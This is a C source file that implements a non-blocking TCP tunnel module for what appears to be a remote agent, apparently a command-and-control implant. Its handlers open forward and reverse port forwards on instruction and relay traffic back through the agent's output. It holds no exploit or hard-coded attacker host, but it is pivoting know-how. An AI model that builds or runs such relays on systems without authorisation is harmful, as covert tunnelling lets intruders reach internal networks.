/* ===== tunnel.c — NAX Linux tunnel (non-blocking, single-threaded) ============ */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <time.h>

#include "nax_linux.h"

#define TUN_STATE_CONNECT  0
#define TUN_STATE_READY    1
#define TUN_STATE_CLOSE    2

#define TUN_MODE_TCP       0
#define TUN_MODE_REVERSE   1

#define TUN_RECV_MAX_ITER      16
#define TUN_RECV_BUDGET_MS     2500
#define TUN_RECV_HDR_RESERVE   16
#define TUN_RECV_CHUNK_MAX     131072u   /* 128KB */
#define TUN_HIGH_WATERMARK     (4*1024*1024)
#define TUN_LOW_WATERMARK      (1*1024*1024)
#define TUN_HARD_CAP           (16*1024*1024)
#define TUN_CONNECT_TIMEOUT_MS 10000
#define TUN_DRAIN_TIMEOUT_MS   5000
#define TUN_CLOSE_GRACE_MS     1000

static NaxTunnel *g_tunnel_head = NULL;

/* ===== Time helper ===== */

static uint64_t tick_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

/* ===== Tunnel list helpers ===== */

static NaxTunnel *tun_find(uint32_t ch) {
    NaxTunnel *t = g_tunnel_head;
    while (t) { if (t->channel_id == ch) return t; t = t->next; }
    return NULL;
}

static NaxTunnel *tun_alloc(uint32_t ch) {
    NaxTunnel *t = calloc(1, sizeof(NaxTunnel));
    if (!t) return NULL;
    t->channel_id = ch;
    t->sock = -1;
    t->next = g_tunnel_head;
    g_tunnel_head = t;
    return t;
}

static void tun_remove(NaxTunnel *target) {
    NaxTunnel **pp = &g_tunnel_head;
    while (*pp) {
        if (*pp == target) {
            *pp = target->next;
            if (target->write_buf) free(target->write_buf);
            free(target);
            return;
        }
        pp = &(*pp)->next;
    }
}

/* ===== Set socket non-blocking ===== */

static void set_nonblock(int fd) {
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

/* ===== Pack a tunnel result entry into output buffer ===== */

static uint32_t pack_entry(uint8_t *out, uint32_t cap, uint32_t cmd,
                            const uint8_t *payload, uint32_t plen) {
    uint32_t entry_len = 4 + plen;
    uint32_t total = 4 + entry_len;
    if (total > cap) return 0;
    out[0]=(uint8_t)entry_len; out[1]=(uint8_t)(entry_len>>8);
    out[2]=(uint8_t)(entry_len>>16); out[3]=(uint8_t)(entry_len>>24);
    out[4]=(uint8_t)cmd; out[5]=(uint8_t)(cmd>>8);
    out[6]=(uint8_t)(cmd>>16); out[7]=(uint8_t)(cmd>>24);
    if (plen > 0) memcpy(out + 8, payload, plen);
    return total;
}

static void pack_u32(uint8_t *p, uint32_t v) {
    p[0]=(uint8_t)v; p[1]=(uint8_t)(v>>8); p[2]=(uint8_t)(v>>16); p[3]=(uint8_t)(v>>24);
}

/* ===== Command handlers (called from dispatcher) ===== */

uint8_t nax_cmd_tunnel_connect_tcp(NaxAgent *a, NaxTask *task,
                                    uint8_t **out, uint32_t *out_len)
{
    (void)a;
    *out = NULL; *out_len = 0;
    if (!task->args || task->args_len < 16) return NAX_STATUS_OK;

    uint8_t *p = task->args;
    uint32_t ch       = p[0]|(p[1]<<8)|(p[2]<<16)|(p[3]<<24);
    uint32_t tp       = p[4]|(p[5]<<8)|(p[6]<<16)|(p[7]<<24);
    uint32_t addr_len = p[8]|(p[9]<<8)|(p[10]<<16)|(p[11]<<24);
    if (task->args_len < 12 + addr_len + 4) return NAX_STATUS_OK;
    uint32_t port     = p[12+addr_len]|(p[13+addr_len]<<8)|(p[14+addr_len]<<16)|(p[15+addr_len]<<24);

    char addr[256] = {0};
    uint32_t al = addr_len < 255 ? addr_len : 255;
    memcpy(addr, p + 12, al);

    NaxTunnel *t = tun_alloc(ch);
    if (!t) return NAX_STATUS_OK;

    t->type       = tp;
    t->state      = TUN_STATE_CONNECT;
    t->mode       = TUN_MODE_TCP;
    t->wait_time  = TUN_CONNECT_TIMEOUT_MS;
    t->start_tick = tick_ms();

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { t->state = TUN_STATE_CLOSE; return NAX_STATUS_OK; }
    t->sock = sock;

    set_nonblock(sock);

    /* Short timeouts for send/recv */
    struct timeval tv = {0, 100000}; /* 100ms */
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, addr, &sa.sin_addr) != 1) {
        struct hostent *he = gethostbyname(addr);
        if (he && he->h_addr_list && he->h_addr_list[0])
            memcpy(&sa.sin_addr, he->h_addr_list[0], 4);
        else { close(sock); t->state = TUN_STATE_CLOSE; return NAX_STATUS_OK; }
    }

    connect(sock, (struct sockaddr *)&sa, sizeof(sa));
    /* non-blocking connect returns EINPROGRESS — we check in process_tunnels */
    return NAX_STATUS_OK;
}

uint8_t nax_cmd_tunnel_write_tcp(NaxAgent *a, NaxTask *task,
                                  uint8_t **out, uint32_t *out_len)
{
    (void)a;
    *out = NULL; *out_len = 0;
    if (!task->args || task->args_len < 8) return NAX_STATUS_OK;

    uint8_t *p = task->args;
    uint32_t ch       = p[0]|(p[1]<<8)|(p[2]<<16)|(p[3]<<24);
    uint32_t data_len = p[4]|(p[5]<<8)|(p[6]<<16)|(p[7]<<24);
    if (task->args_len < 8 + data_len) return NAX_STATUS_OK;

    NaxTunnel *t = tun_find(ch);
    if (!t || t->state == TUN_STATE_CLOSE) return NAX_STATUS_OK;

    uint8_t *data = p + 8;

    /* Try immediate send if no buffered data */
    if (!t->write_buf || t->write_buf_size == 0) {
        while (data_len > 0) {
            ssize_t sent = send(t->sock, data, data_len, MSG_NOSIGNAL);
            if (sent > 0) { data += sent; data_len -= sent; }
            else break;
        }
        if (data_len == 0) return NAX_STATUS_OK;
    }

    /* Buffer remaining data */
    uint32_t new_size = t->write_buf_size + data_len;
    if (new_size > TUN_HARD_CAP) { t->state = TUN_STATE_CLOSE; return NAX_STATUS_OK; }
    uint8_t *nb = malloc(new_size);
    if (!nb) { t->state = TUN_STATE_CLOSE; return NAX_STATUS_OK; }
    if (t->write_buf && t->write_buf_size > 0)
        memcpy(nb, t->write_buf, t->write_buf_size);
    memcpy(nb + t->write_buf_size, data, data_len);
    free(t->write_buf);
    t->write_buf = nb;
    t->write_buf_size = new_size;

    return NAX_STATUS_OK;
}

uint8_t nax_cmd_tunnel_close(NaxAgent *a, NaxTask *task,
                              uint8_t **out, uint32_t *out_len)
{
    (void)a;
    *out = NULL; *out_len = 0;
    if (!task->args || task->args_len < 4) return NAX_STATUS_OK;
    uint32_t ch = task->args[0]|(task->args[1]<<8)|(task->args[2]<<16)|(task->args[3]<<24);
    NaxTunnel *t = tun_find(ch);
    if (t) { t->state = TUN_STATE_CLOSE; t->close_timer = 0; }
    return NAX_STATUS_OK;
}

uint8_t nax_cmd_tunnel_reverse(NaxAgent *a, NaxTask *task,
                                uint8_t **out, uint32_t *out_len)
{
    (void)a;
    *out = NULL; *out_len = 0;
    if (!task->args || task->args_len < 8) return NAX_STATUS_OK;

    uint8_t *p = task->args;
    uint32_t tid      = p[0]|(p[1]<<8)|(p[2]<<16)|(p[3]<<24);
    uint32_t port     = p[4]|(p[5]<<8)|(p[6]<<16)|(p[7]<<24);
    uint8_t  bind_all = task->args_len >= 9 ? p[8] : 0;

    NaxTunnel *t = tun_alloc(tid);
    if (!t) return NAX_STATUS_OK;

    t->type       = 0;
    t->state      = TUN_STATE_CONNECT;
    t->mode       = TUN_MODE_REVERSE;
    t->wait_time  = 0;
    t->start_tick = tick_ms();

    int srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0) { t->state = TUN_STATE_CLOSE; return NAX_STATUS_OK; }
    t->sock = srv;

    int reuse = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    set_nonblock(srv);

    struct sockaddr_in sa = {0};
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons((uint16_t)port);
    sa.sin_addr.s_addr = bind_all ? INADDR_ANY : htonl(INADDR_LOOPBACK);

    if (bind(srv, (struct sockaddr *)&sa, sizeof(sa)) != 0 ||
        listen(srv, 10) != 0) {
        close(srv);
        t->state = TUN_STATE_CLOSE;
        return NAX_STATUS_OK;
    }

    t->state = TUN_STATE_READY;
    return NAX_STATUS_OK;
}

uint8_t nax_cmd_tunnel_pause(NaxAgent *a, NaxTask *task,
                              uint8_t **out, uint32_t *out_len)
{
    (void)a; *out = NULL; *out_len = 0;
    if (!task->args || task->args_len < 4) return NAX_STATUS_OK;
    uint32_t ch = task->args[0]|(task->args[1]<<8)|(task->args[2]<<16)|(task->args[3]<<24);
    NaxTunnel *t = tun_find(ch);
    if (t) t->srv_paused = 1;
    return NAX_STATUS_OK;
}

uint8_t nax_cmd_tunnel_resume(NaxAgent *a, NaxTask *task,
                               uint8_t **out, uint32_t *out_len)
{
    (void)a; *out = NULL; *out_len = 0;
    if (!task->args || task->args_len < 4) return NAX_STATUS_OK;
    uint32_t ch = task->args[0]|(task->args[1]<<8)|(task->args[2]<<16)|(task->args[3]<<24);
    NaxTunnel *t = tun_find(ch);
    if (t) t->srv_paused = 0;
    return NAX_STATUS_OK;
}

/* ===== HEARTBEAT PROCESSOR — called every cycle, does ALL tunnel I/O ===== */

void nax_process_tunnels(NaxAgent *a) {
    (void)a;
    /* This function is now a no-op stub.
     * The actual processing is done in nax_process_tunnels_ex() which returns
     * packed tunnel data directly into the output buffer. */
}

uint32_t nax_process_tunnels_ex(NaxAgent *a, uint8_t *out, uint32_t out_cap) {
    (void)a;
    if (!g_tunnel_head) return 0;

    uint32_t written = 0;
    uint64_t now = tick_ms();

    /* Phase 1: Check connecting sockets */
    NaxTunnel *t = g_tunnel_head;
    while (t) {
        NaxTunnel *next = t->next;

        if (t->state == TUN_STATE_CONNECT && t->mode == TUN_MODE_TCP) {
            struct pollfd pfd = {t->sock, POLLOUT, 0};
            int pr = poll(&pfd, 1, 0); /* instant check */

            if (pr > 0 && (pfd.revents & POLLOUT)) {
                int err = 0; socklen_t el = sizeof(err);
                getsockopt(t->sock, SOL_SOCKET, SO_ERROR, &err, &el);
                if (err == 0) {
                    t->state = TUN_STATE_READY;
                    uint8_t rb[12]; pack_u32(rb, t->channel_id); pack_u32(rb+4, t->type); pack_u32(rb+8, 0);
                    written += pack_entry(out+written, out_cap-written, NAX_CMD_TUNNEL_CONNECT_TCP, rb, 12);
                } else {
                    t->state = TUN_STATE_CLOSE;
                    uint8_t rb[12]; pack_u32(rb, t->channel_id); pack_u32(rb+4, t->type); pack_u32(rb+8, 1);
                    written += pack_entry(out+written, out_cap-written, NAX_CMD_TUNNEL_CONNECT_TCP, rb, 12);
                }
            } else if (t->wait_time > 0 && (now - t->start_tick) > t->wait_time) {
                t->state = TUN_STATE_CLOSE;
                uint8_t rb[12]; pack_u32(rb, t->channel_id); pack_u32(rb+4, t->type); pack_u32(rb+8, 1);
                written += pack_entry(out+written, out_cap-written, NAX_CMD_TUNNEL_CONNECT_TCP, rb, 12);
            }
        }

        /* Check reverse listeners for incoming connections */
        if (t->state == TUN_STATE_READY && t->mode == TUN_MODE_REVERSE) {
            struct pollfd pfd = {t->sock, POLLIN, 0};
            int pr = poll(&pfd, 1, 0);
            if (pr > 0 && (pfd.revents & POLLIN)) {
                int csock = accept(t->sock, NULL, NULL);
                if (csock >= 0) {
                    set_nonblock(csock);
                    struct timeval tv = {0, 100000};
                    setsockopt(csock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                    setsockopt(csock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

                    uint32_t new_ch = (uint32_t)((uint64_t)csock ^ (now & 0xFFFFFFFF));
                    NaxTunnel *ct = tun_alloc(new_ch);
                    if (ct) {
                        ct->sock  = csock;
                        ct->state = TUN_STATE_READY;
                        ct->mode  = TUN_MODE_TCP;
                        ct->type  = t->type;
                        uint8_t ab[8]; pack_u32(ab, t->channel_id); pack_u32(ab+4, new_ch);
                        written += pack_entry(out+written, out_cap-written, NAX_CMD_TUNNEL_ACCEPT, ab, 8);
                    } else {
                        close(csock);
                    }
                }
            }
        }

        t = next;
    }

    /* Phase 2: Drain write buffers */
    t = g_tunnel_head;
    while (t) {
        if (t->state == TUN_STATE_READY && t->write_buf && t->write_buf_size > 0) {
            uint32_t total_sent = 0;
            while (total_sent < t->write_buf_size) {
                ssize_t sent = send(t->sock, t->write_buf + total_sent,
                                    t->write_buf_size - total_sent, MSG_NOSIGNAL);
                if (sent > 0) total_sent += (uint32_t)sent;
                else break;
            }
            if (total_sent > 0) {
                if (total_sent >= t->write_buf_size) {
                    free(t->write_buf); t->write_buf = NULL; t->write_buf_size = 0;
                } else {
                    uint32_t rem = t->write_buf_size - total_sent;
                    memmove(t->write_buf, t->write_buf + total_sent, rem);
                    t->write_buf_size = rem;
                }
            }
            /* Resume if buffer dropped below low watermark */
            if (t->paused && t->write_buf_size < TUN_LOW_WATERMARK) {
                t->paused = 0;
                uint8_t pb[4]; pack_u32(pb, t->channel_id);
                written += pack_entry(out+written, out_cap-written, NAX_CMD_TUNNEL_RESUME, pb, 4);
            }
        }
        t = t->next;
    }

    /* Phase 3: Recv from ready sockets */
    uint64_t recv_start = tick_ms();
    uint32_t total_recv = 0;

    t = g_tunnel_head;
    while (t) {
        if (t->state == TUN_STATE_READY && t->mode == TUN_MODE_TCP && !t->srv_paused) {
            for (int i = 0; i < TUN_RECV_MAX_ITER; i++) {
                if ((tick_ms() - recv_start) > TUN_RECV_BUDGET_MS) break;
                if (total_recv >= TUN_HIGH_WATERMARK) break;

                struct pollfd pfd = {t->sock, POLLIN, 0};
                if (poll(&pfd, 1, 0) <= 0 || !(pfd.revents & POLLIN)) break;

                uint32_t space = out_cap - written;
                if (space < TUN_RECV_HDR_RESERVE) break;
                uint32_t max_recv = space - TUN_RECV_HDR_RESERVE;
                if (max_recv > TUN_RECV_CHUNK_MAX) max_recv = TUN_RECV_CHUNK_MAX;

                /* Read directly into output buffer after the header slot */
                uint8_t *recv_base = out + written + 8 + 8;
                ssize_t got = recv(t->sock, recv_base, max_recv, 0);

                if (got > 0) {
                    /* Fill header in-place */
                    uint8_t ph[8];
                    pack_u32(ph, t->channel_id);
                    pack_u32(ph+4, (uint32_t)got);
                    memcpy(out + written + 8, ph, 8);

                    uint32_t entry_len = 4 + 8 + (uint32_t)got;
                    uint32_t total = 4 + entry_len;
                    pack_u32(out + written, entry_len);
                    uint32_t cmd = NAX_CMD_TUNNEL_WRITE_TCP;
                    pack_u32(out + written + 4, cmd);

                    written   += total;
                    total_recv += (uint32_t)got;
                } else if (got == 0) {
                    t->state = TUN_STATE_CLOSE;
                    break;
                } else {
                    if (errno != EAGAIN && errno != EWOULDBLOCK)
                        t->state = TUN_STATE_CLOSE;
                    break;
                }
            }

            /* Pause if output exceeds high watermark */
            if (total_recv >= TUN_HIGH_WATERMARK && !t->paused) {
                t->paused = 1;
                uint8_t pb[4]; pack_u32(pb, t->channel_id);
                written += pack_entry(out+written, out_cap-written, NAX_CMD_TUNNEL_PAUSE, pb, 4);
            }
        }
        t = t->next;
    }

    /* Phase 4: Cleanup closed tunnels */
    t = g_tunnel_head;
    while (t) {
        NaxTunnel *next = t->next;

        if (t->state == TUN_STATE_CLOSE) {
            /* Drain write buffer first */
            if (t->write_buf && t->write_buf_size > 0) {
                if (t->close_timer == 0) {
                    t->close_timer = 1;
                    t->start_tick = now;
                } else if ((now - t->start_tick) > TUN_DRAIN_TIMEOUT_MS) {
                    shutdown(t->sock, SHUT_RDWR);
                    close(t->sock);
                    tun_remove(t);
                }
                t = next;
                continue;
            }

            if (t->close_timer <= 1) {
                t->close_timer = 2;
                t->start_tick = now;

                uint8_t cb[12];
                pack_u32(cb, t->channel_id); pack_u32(cb+4, t->type); pack_u32(cb+8, 0);
                written += pack_entry(out+written, out_cap-written, NAX_CMD_TUNNEL_CLOSE, cb, 12);
                shutdown(t->sock, SHUT_WR);
            } else if ((now - t->start_tick) > TUN_CLOSE_GRACE_MS) {
                close(t->sock);
                tun_remove(t);
            }
        }

        t = next;
    }

    return written;
}
